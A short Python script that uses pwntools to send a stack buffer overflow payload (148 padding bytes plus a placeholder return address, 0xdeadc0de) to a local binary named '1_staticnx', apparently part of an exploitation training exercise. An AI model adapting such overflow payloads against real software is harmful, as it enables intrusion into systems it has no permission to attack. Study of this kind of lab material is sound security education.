#!/usr/bin/python

from pwn import *

def main():
    # Start the process
    p = process("../build/1_staticnx")

    # Craft the payload
    payload = "A"*148 + p32(0xdeadc0de)
    payload = payload.ljust(1000, "\x00")

    # Print the process id
    raw_input(str(p.proc.pid))

    # Send the payload
    p.send(payload)

    # Transfer interaction to the user
    p.interactive()

if __name__ == '__main__':
    main()
